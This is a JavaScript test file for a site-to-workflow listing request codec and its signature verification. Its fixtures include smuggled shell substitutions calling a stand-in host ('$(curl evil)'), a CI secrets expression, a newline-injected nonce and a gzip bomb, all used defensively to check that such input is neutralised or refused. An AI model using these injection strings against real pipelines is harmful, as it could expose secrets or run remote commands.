// The form a listing request takes on its way from the site to the signing workflow (node P15): the exact
// bytes the maker's wallet signed for, in a form that holds nothing a shell or an expression could read.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import zlib from 'node:zlib';

import { authMessageText, LIST_ACTION } from '../src/authMessage.js';
import {
  SITE_REQUEST_MAX_BYTES,
  decodeSiteAuth,
  decodeSiteRequest,
  encodeSiteAuth,
  encodeSiteRequest,
  serializeKnownIssues,
  specChanges,
  verifySiteRequest,
} from '../src/siteRequest.js';

const MAKER = '0x5B38Da6a701c568545dCfcB03FcB875f56beddC4';
const signed = JSON.stringify({ spec: { repo: 'https://github.com/acme/vault', commands: { setup: 'echo ${{ secrets.X }} $(curl evil)' } }, allowlist: [], maker: MAKER });
const auth = { nonce: 'a'.repeat(32), issuedAt: '2026-11-05T12:00:00Z', expiresAt: '2026-11-05T12:05:00Z', signature: `0x${'1'.repeat(130)}` };
const sha256 = (s) => crypto.createHash('sha256').update(s).digest('hex');
const getAddress = (a) => { assert.equal(a, MAKER.toLowerCase()); return MAKER; };

test('a request survives the trip byte for byte, and its form holds nothing an expression or a shell could read', () => {
  const text = encodeSiteRequest(signed);
  assert.match(text, /^[A-Za-z0-9+/]+={0,2}$/);
  assert.doesNotMatch(text, /\$\{\{|\$\(/);
  assert.equal(decodeSiteRequest(text), signed);
});

test('what cannot be a request is refused by a code, and a small input cannot inflate past the bound', () => {
  for (const bad of ['', 'not base64!', '$(curl evil)', '${{ secrets.X }}', 'a\nb', Buffer.from('not gzip').toString('base64'), 42, null]) {
    assert.throws(() => decodeSiteRequest(bad), (e) => e.code === 'SITE_REQUEST_INVALID', String(bad));
  }
  const bomb = zlib.gzipSync(Buffer.alloc(SITE_REQUEST_MAX_BYTES + 1, 0x20)).toString('base64');
  assert.ok(bomb.length < 20000, 'a small input');
  assert.throws(() => decodeSiteRequest(bomb), (e) => e.code === 'SITE_REQUEST_INVALID');
});

test('the auth blob carries the challenge\'s fields and nothing else, each in its form', () => {
  assert.deepEqual(decodeSiteAuth(encodeSiteAuth(auth)), { ...auth, stakeChainId: null, stakeContract: null });
  const withStake = { ...auth, stakeChainId: 84532, stakeContract: MAKER };
  assert.deepEqual(decodeSiteAuth(encodeSiteAuth(withStake)), withStake);
  const encoded = (o) => Buffer.from(JSON.stringify(o)).toString('base64');
  for (const bad of [{ ...auth, nonce: 'x' }, { ...auth, nonce: `${'a'.repeat(32)}\nAction: other` }, { ...auth, issuedAt: 'soon' }, { ...auth, expiresAt: 1 }, { ...auth, signature: 'nope' }, { ...auth, stakeChainId: 'x', stakeContract: MAKER }, { ...auth, stakeChainId: 1, stakeContract: 'no' }, { ...auth, more: 1 }]) {
    assert.throws(() => decodeSiteAuth(encoded(bad)), (e) => e.code === 'SITE_AUTH_INVALID', JSON.stringify(bad));
  }
  assert.throws(() => decodeSiteAuth('!!'), (e) => e.code === 'SITE_AUTH_INVALID');
});

test('verification rebuilds the message from the request\'s own digest, so a signature of anything else does not recover', () => {
  const seen = [];
  const verifyMessage = (message, signature) => { seen.push({ message, signature }); return MAKER; };
  const r = verifySiteRequest({ request: encodeSiteRequest(signed), auth: encodeSiteAuth(auth), maker: MAKER }, { verifyMessage, getAddress });
  assert.equal(r.maker, MAKER);
  assert.deepEqual(r.body, JSON.parse(signed));
  assert.equal(seen[0].message, authMessageText({ action: LIST_ACTION, resource: `list-request:${sha256(signed)}`, address: MAKER, nonce: auth.nonce, issuedAt: auth.issuedAt, expiresAt: auth.expiresAt }));
  assert.equal(seen[0].signature, auth.signature);
});

test('another wallet, another maker, an unknown field or no spec: refused by a code', () => {
  const ok = { request: encodeSiteRequest(signed), auth: encodeSiteAuth(auth), maker: MAKER };
  const deps = { verifyMessage: () => MAKER, getAddress };
  assert.throws(() => verifySiteRequest(ok, { ...deps, verifyMessage: () => '0x0000000000000000000000000000000000000001' }), (e) => e.code === 'MAKER_SIGNATURE_INVALID');
  assert.throws(() => verifySiteRequest(ok, { ...deps, verifyMessage: () => { throw new Error('bad'); } }), (e) => e.code === 'MAKER_SIGNATURE_INVALID');
  assert.throws(() => verifySiteRequest({ ...ok, maker: '0x0000000000000000000000000000000000000001' }, { ...deps, getAddress: (a) => a }), (e) => e.code === 'SITE_REQUEST_MAKER_MISMATCH');
  assert.throws(() => verifySiteRequest({ ...ok, request: encodeSiteRequest(JSON.stringify({ spec: {}, maker: MAKER, auth: {} })) }, deps), (e) => e.code === 'SITE_REQUEST_INVALID');
  assert.throws(() => verifySiteRequest({ ...ok, request: encodeSiteRequest(JSON.stringify({ maker: MAKER })) }, deps), (e) => e.code === 'SITE_REQUEST_INVALID');
  assert.throws(() => verifySiteRequest({ ...ok, request: encodeSiteRequest('[]') }, deps), (e) => e.code === 'SITE_REQUEST_INVALID');
  assert.throws(() => verifySiteRequest({ ...ok, request: encodeSiteRequest('{') }, deps), (e) => e.code === 'SITE_REQUEST_INVALID');
  assert.throws(() => verifySiteRequest({ ...ok, request: encodeSiteRequest(JSON.stringify({ spec: {}, maker: 'nobody' })) }, deps), (e) => e.code === 'MAKER_INVALID');
});

test('specChanges: what the builder fills may change, and nothing else', () => {
  const names = { attestationFile: 'attestation.json', baselineFile: 'baseline.json' };
  const draft = { repo: 'r', baseCommit: 'c', env: { from: 'foundry' }, limits: { cpus: 2 }, stake: { disclosureKey: 'k' } };
  const built = { ...draft, env: { from: 'foundry', image: 'i', platform: 'p', unpackedBytes: 1 }, limits: { cpus: 2, memoryMb: 1 }, attestation: 'attestation.json', baseline: 'baseline.json' };
  assert.deepEqual(specChanges(draft, built, names), []);
  assert.deepEqual(specChanges(draft, { ...built, stake: { disclosureKey: 'thief' } }, names), ['/stake']);
  assert.deepEqual(specChanges(draft, { ...built, repo: 'other' }, names), ['/repo']);
  assert.deepEqual(specChanges(draft, { ...built, env: { ...built.env, from: 'other' } }, names), ['/env/from']);
  assert.deepEqual(specChanges(draft, { ...built, limits: { cpus: 16 } }, names), ['/limits/cpus']);
  assert.deepEqual(specChanges(draft, { ...built, attestation: 'x' }, names), ['/attestation']);
  assert.deepEqual(specChanges(draft, { ...built, baseline: 'x' }, names), ['/baseline']);
  assert.deepEqual(specChanges(draft, { ...built, extra: 1 }, names), ['/extra']);
});

test('known issues are written as the builder and the server write them', () => {
  assert.equal(serializeKnownIssues([{ id: 'a' }]).toString(), '[\n  {\n    "id": "a"\n  }\n]\n');
});
